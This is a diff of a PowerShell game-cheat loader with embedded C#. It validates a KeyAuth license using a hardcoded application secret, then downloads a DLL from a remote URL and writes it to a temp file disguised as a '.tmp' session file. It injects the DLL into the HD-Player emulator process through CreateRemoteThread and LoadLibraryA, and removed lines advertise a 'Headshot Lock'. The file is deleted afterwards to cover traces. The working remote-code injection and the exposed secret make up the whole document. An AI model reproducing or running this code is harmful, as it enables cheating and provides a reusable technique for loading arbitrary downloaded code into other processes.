@@ -1,7 +1,7 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# --- KeyAuth Config ---
+# --- KeyAuth Configuration ---
 $Name    = "Relaxwtf777's Application"
 $OwnerID = "W404AorT6U"
 $Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
@@ -16,16 +16,20 @@ function Show-Auth {
     param($savedKey = $null)
     Clear-Host
     Write-Host "==============================" -ForegroundColor Cyan
-    Write-Host "    BASX STEALTH INJECTOR     " -ForegroundColor Cyan
+    Write-Host "    BASX DYNAMIC INJECTOR     " -ForegroundColor Cyan
     Write-Host "==============================" -ForegroundColor Cyan
+    
     $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
     try {
         $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
         $sessionId = $initRes.sessionid
     } catch { return $null }
+
     if ($null -ne $savedKey) { $key = $savedKey } else { $key = Read-Host " Enter License Key" }
+
     $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
     $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$sessionId&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
+    
     try {
         $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
         if ($loginRes.success -eq $true) {
@@ -51,77 +55,62 @@ if (Show-Auth -savedKey $currentKey) {
     using System.Net;
     using System.IO;
 
-    public class StealthNode {
+    public class DynamicNode {
         [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dw, bool b, int p);
         [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
         [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
-        [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out int r);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
+        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
         [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);
+        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
 
-        public static void ForceInject(string url, int pid) {
+        public static bool InjectFromStream(string url, int pid) {
             try {
                 WebClient wc = new WebClient();
                 wc.Headers.Add("User-Agent", "Mozilla/5.0");
                 byte[] dllBytes = wc.DownloadData(url);
 
                 IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
-                if (hProc == IntPtr.Zero) return;
+                if (hProc == IntPtr.Zero) return false;
 
-                // Create a temporary file with a very short lifespan
-                string tempDll = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString().Substring(0,8) + ".dll");
-                File.WriteAllBytes(tempDll, dllBytes);
+                string tPath = Path.Combine(Path.GetTempPath(), "sess_" + Guid.NewGuid().ToString().Substring(0,8) + ".tmp");
+                File.WriteAllBytes(tPath, dllBytes);
 
-                IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)tempDll.Length + 1, 0x3000, 0x40);
+                IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)tPath.Length + 1, 0x3000, 0x40);
                 IntPtr w;
-                WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(tempDll), (uint)tempDll.Length + 1, out w);
+                WriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(tPath), (uint)tPath.Length + 1, out w);
                 
                 IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                 IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
-
-                // Wait for the thread to finish and clean up immediately
-                WaitForSingleObject(hThread, 5000);
-                if (File.Exists(tempDll)) File.Delete(tempDll);
+                
+                if (hThread != IntPtr.Zero) {
+                    System.Threading.Thread.Sleep(2000);
+                    if (File.Exists(tPath)) File.Delete(tPath);
+                    CloseHandle(hThread);
+                    CloseHandle(hProc);
+                    return true;
+                }
             } catch { }
-        }
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
-        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
-        [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
-
-        public static bool IsInjected(int pid, long address) {
-            IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
-            if (hProc == IntPtr.Zero) return false;
-            byte[] buffer = new byte[2];
-            int read;
-            if (ReadProcessMemory(hProc, (IntPtr)address, buffer, 2, out read)) {
-                // Return true only if pattern matches 0xFF 0xFF
-                return buffer[0] == 0xFF && buffer[1] == 0xFF;
-            }
             return false;
         }
     }
 "@
     Add-Type -TypeDefinition $Source
 
-    Write-Host "[*] Status: Monitoring HD-Player" -ForegroundColor Cyan
+    Write-Host "[*] Status: Looking for $targetProc..." -ForegroundColor Cyan
     while ($true) {
         $p = Get-Process $targetProc -ErrorAction SilentlyContinue
         if ($p) {
-            # Check pattern at 0x2EC
-            if (![StealthNode]::IsInjected($p.Id, 0x2EC)) {
-                Write-Host "[!] Mismatch detected. Attempting Force Injection..." -ForegroundColor Yellow
-                [StealthNode]::ForceInject($dllUrl, $p.Id)
-                
-                # Wait for the game to process the injection
-                Start-Sleep -Seconds 5
-                
-                if ([StealthNode]::IsInjected($p.Id, 0x2EC)) {
-                    Write-Host "[+] Injection Success! Headshot Lock Active." -ForegroundColor Green
-                } else {
-                    Write-Host "[-] Injection Failed. Retrying in 10s..." -ForegroundColor Red
-                }
+            Write-Host "[*] Target found. Injecting components..." -ForegroundColor Yellow
+            if ([DynamicNode]::InjectFromStream($dllUrl, $p.Id)) {
+                Write-Host "[+] Injection completed successfully!" -ForegroundColor Green
+                Write-Host "[*] You can now press F6 in game." -ForegroundColor White
+                # หยุดลูปเมื่อฉีดสำเร็จ เพื่อไม่ให้ฉีดซ้ำจนเครื่องค้าง
+                break
+            } else {
+                Write-Host "[-] Failed to access process. Retrying..." -ForegroundColor Red
             }
         }
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 5
     }
 }
